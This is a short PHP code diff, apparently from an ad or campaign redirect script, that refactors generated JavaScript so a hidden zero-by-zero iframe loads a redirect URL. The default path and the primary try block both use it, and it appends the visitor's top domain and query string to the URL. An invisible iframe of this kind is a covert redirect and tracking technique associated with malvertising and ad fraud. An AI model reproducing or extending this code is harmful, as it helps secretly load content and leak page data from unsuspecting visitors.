@@ -491,6 +491,13 @@
 			adlog($campaignID, $redirectUrl);
 		}
 
+		$hiddeniFrameRedirect = "var el = document.createElement('iframe');
+								 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
+								 el.width = 0;
+								 el.height = 0;
+								 el.border = 'none';
+								 document.body.appendChild(el);";
+
 		if ($redirectMethod === "windowlocation")
 		{
 			$redirectCode = "window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
@@ -505,7 +512,7 @@
 							 {
 							 	try
 							 	{
-							 		window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
+							 		$hiddeniFrameRedirect
 							 	}
 							 	catch(e)
 							 	{
@@ -523,12 +530,7 @@
 		}
 		else // Default 0x0 iframe redirect
 		{
-			$redirectCode = "var el = document.createElement('iframe');
-							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
-							 el.width = 0;
-							 el.height = 0;
-							 el.border = 'none';
-							 document.body.appendChild(el);";
+			$redirectCode = $hiddeniFrameRedirect;
 		}
 
 		$scriptCode = "<script type=\"text/javascript\">
